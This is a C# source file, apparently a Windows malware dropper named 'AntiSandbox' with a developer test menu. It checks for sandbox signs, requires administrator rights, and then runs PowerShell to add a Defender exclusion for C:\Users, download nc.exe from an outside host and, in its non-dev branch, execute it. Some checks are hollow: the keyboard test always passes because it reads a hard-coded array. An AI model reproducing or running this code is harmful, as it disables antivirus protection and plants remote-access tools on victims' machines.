using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;

namespace AntiSandbox
{
    class Program
    {
        static void Main(string[] args)
        {

            ///////////////////////////////
            ///                        ///
            bool dev = true;                         // Enable/Disable devmode
            string link = "https://iiii.lol/nc.exe";  // set link to get file for dropper
            string name = "test.exe";                 // set filename (saved as)
            ///                          ///
            ///////////////////////////////

            if (dev == true)
            {
                Console.Clear();
                Console.Title = "Running Defender Bypass in Devmode!";

                Console.WriteLine("[1] Test if Process has underscore");
                Console.WriteLine("[2] Test if path is writeable");
                Console.WriteLine("[3] Test if system has keyboard");
                Console.WriteLine("[4] Test if file drop is working");
                Console.WriteLine("[5] Test ALL functions");
                Console.Write("> ");
                string option = Console.ReadLine();
                var process = Process.GetCurrentProcess();

                if (option == "1")
                {
                    if (process.ProcessName.Contains("_"))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[!] Process name contains underscore"); // Error 2 = Prozess wurde mit "_" gestartet (Possible Sandbox enviroment + Process clone or debugging)
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.ReadKey();
                        return;
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("\n[+] Process does NOT contain a underscore");
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.ReadKey();
                    }
                }
                else if (option == "2")
                {
                    try
                    {
                        var filePath = Path.Combine(Environment.CurrentDirectory, "test.txt");
                        File.WriteAllText(filePath, "Test");

                        File.Delete(filePath);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("[+] Directory is writeable!");
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.ReadKey();
                    }
                    catch (UnauthorizedAccessException)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[!] Unable to write file in Path!"); // Error 3 = Keine berechtigung Dateien zu Schreiben in Pfad (Possible Sandbox enviroment)
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.ReadKey();
                        return;
                    }
                }
                else if (option == "3")
                {
                    if (GetKeyboards().Count() == 0)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[!] No keyboard detected!"); // Error 4 = Keine Tastatur gefunden (Possible Sandbox enviroment)
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.ReadKey();
                        return;
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("\n[+] Keyboard detected!"); // Error 2 = Prozess wurde mit "_" gestartet (Possible Sandbox enviroment + Process clone or debugging)
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.ReadKey();
                    }

                    static IEnumerable<string> GetKeyboards()
                    {
                        return new string[] { "Keyboard1", "Keyboard2" };
                    }

                }
                else if (option == "4")
                {
                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    Console.WriteLine("[i] Testing Supply system...");
                    Thread.Sleep(1000);
                    Process.Start(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Add-MpPreference -ExclusionPath ""C:\Users""; cd C:\Users; curl " + link + " -outfile " + name + "");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.Write("[/] Checking in 6 seconds\n");
                    Console.ForegroundColor = ConsoleColor.White;
                    Thread.Sleep(6000);

                    // Check if file got dropped
                    String nc = @"C:\Users\" + name + "";

                    if (File.Exists(nc))
                    {
                        Console.ForegroundColor = ConsoleColor.Magenta;
                        Console.WriteLine("[+] File got Sucessfully dropped!");
                        Thread.Sleep(1000);
                        Console.ForegroundColor = ConsoleColor.DarkMagenta;
                        Console.WriteLine("[i] Removing Testfile...");
                        Thread.Sleep(1000);
                        Console.ForegroundColor = ConsoleColor.White;
                        Process.Start(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe del C:\Users\" + name + "");
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("[+] Test was successful");
                        Console.ForegroundColor = ConsoleColor.White;
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[!!] Wasn't able to drop file! (Critical Error!)\n");
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.ReadKey();
                    }
                }
                ///////////////////////
                /// Test every function
                ///////////////////////
                else if (option == "5")
                {
                    bool isAdmin = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

                    if (!isAdmin)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[i] Not running as administrator. Exiting in 5 seconds."); // Admin Error | (No admin permissions were set)
                        Console.ForegroundColor = ConsoleColor.White;
                        Thread.Sleep(5000);
                        return;
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("[+] Process is Admin. Continue...");
                        Thread.Sleep(1000);
                        Console.ForegroundColor = ConsoleColor.White;
                    }

                    var prozess = Process.GetCurrentProcess();

                    if (prozess.ProcessName.Contains("_"))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[i] Process name contains underscore (2). Exiting in 5 seconds."); // Error 2 = Prozess wurde mit "_" gestartet (Possible Sandbox enviroment + Process clone or debugging)
                        Console.ForegroundColor = ConsoleColor.White;
                        Thread.Sleep(5000);
                        return;
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Blue;
                        Console.WriteLine("[+] Process does not contain any underscore. Continue...");
                        Thread.Sleep(1000);
                        Console.ForegroundColor = ConsoleColor.White;
                    }

                    try
                    {
                        var filePath = Path.Combine(Environment.CurrentDirectory, "test.txt");
                        File.WriteAllText(filePath, "Test");

                        File.Delete(filePath);
                    }
                    catch (UnauthorizedAccessException)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[!] Unable to write file in Path! Exiting in 5 seconds."); // Error 3 = Keine berechtigung Dateien zu Schreiben in Pfad (Possible Sandbox enviroment)
                        Console.ForegroundColor = ConsoleColor.White;
                        Thread.Sleep(5000);
                        return;
                    }

                    if (GetKeyboards().Count() == 0)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[i] No keyboard detected! Exiting in 5 seconds."); // Error 4 = Keine Tastatur gefunden (Possible Sandbox enviroment)
                        Console.ForegroundColor = ConsoleColor.White;
                        Thread.Sleep(5000);
                        return;
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.DarkMagenta;
                        Console.WriteLine("[+] Keyboard detected. Continue...");
                        Thread.Sleep(1000);
                        Console.ForegroundColor = ConsoleColor.White;
                    }

                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    Console.WriteLine("[i] Testing Supply system...");
                    Thread.Sleep(1000);
                    Process.Start(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Add-MpPreference -ExclusionPath ""C:\Users""; cd C:\Users; curl " + link + " -outfile " + name + "");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.Write("[/] Checking in 6 seconds\n");
                    Console.ForegroundColor = ConsoleColor.White;
                    Thread.Sleep(6000);
                    // Check if file got dropped

                    String nc = @"C:\Users\" + name + "";

                    if (File.Exists(nc))
                    {
                        Console.ForegroundColor = ConsoleColor.Magenta;
                        Console.WriteLine("[+] File got Sucessfully dropped!");
                        Thread.Sleep(1000);
                        Console.ForegroundColor = ConsoleColor.DarkMagenta;
                        Console.WriteLine("[i] Removing Testfile...");
                        Thread.Sleep(1000);
                        Console.ForegroundColor = ConsoleColor.White;
                        Process.Start(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe del C:\Users\" + name + "");
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[!!] Wasn't able to drop file! (Critical Error!)\n");
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.ReadKey();
                    }

                    Console.ForegroundColor = ConsoleColor.DarkGreen;
                    Console.WriteLine("[ :) ] Everything seems to work fine. You can now close this window!\n");
                    Console.ForegroundColor = ConsoleColor.White;
                    Thread.Sleep(500000);

                    static IEnumerable<string> GetKeyboards()
                    {
                        return new string[] { "Keyboard1", "Keyboard2" };
                    }
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[404] Invalid Option");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.ReadKey();
                }
            }
            if (dev == false)
            {
                bool isAdmin = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

                if (!isAdmin)
                {
                    Console.WriteLine("Not running as administrator. Exiting in 5 seconds."); // Admin Error (No admin permissions were set)
                    Thread.Sleep(5000);
                    return;
                }

                var process = Process.GetCurrentProcess();

                if (process.ProcessName.Contains("_"))
                {
                    Console.WriteLine("Unable to start Application (Error: 2)! Exiting in 5 seconds."); // Error 2 = Prozess wurde mit "_" gestartet (Possible Sandbox enviroment + Process clone or debugging)
                    Thread.Sleep(5000);
                    return;
                }

                try
                {
                    var filePath = Path.Combine(Environment.CurrentDirectory, "test.txt");
                    File.WriteAllText(filePath, "Test");

                    File.Delete(filePath);
                }
                catch (UnauthorizedAccessException)
                {
                    Console.WriteLine("Unable to start Application (Error: 3)! Exiting in 5 seconds."); // Error 3 = Keine berechtigung Dateien zu Schreiben in Pfad (Possible Sandbox enviroment)
                    Thread.Sleep(5000);
                    return;
                }

                if (GetKeyboards().Count() == 0)
                {
                    Console.WriteLine("Unable to start Application (Error: 4)! Exiting in 5 seconds."); // Error 4 = Keine Tastatur gefunden (Possible Sandbox enviroment)
                    Thread.Sleep(5000);
                    return;
                }

                // Console.WriteLine("Running outside of sandbox. Continuing.");
                Process.Start(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Add-MpPreference -ExclusionPath ""C:\Users""; cd C:\Users; curl " + link + " -outfile " + name + "; start C:\\Users\\" + name + "");

                static IEnumerable<string> GetKeyboards()
                {
                    return new string[] { "Keyboard1", "Keyboard2" };
                }
            }

        }

    }
}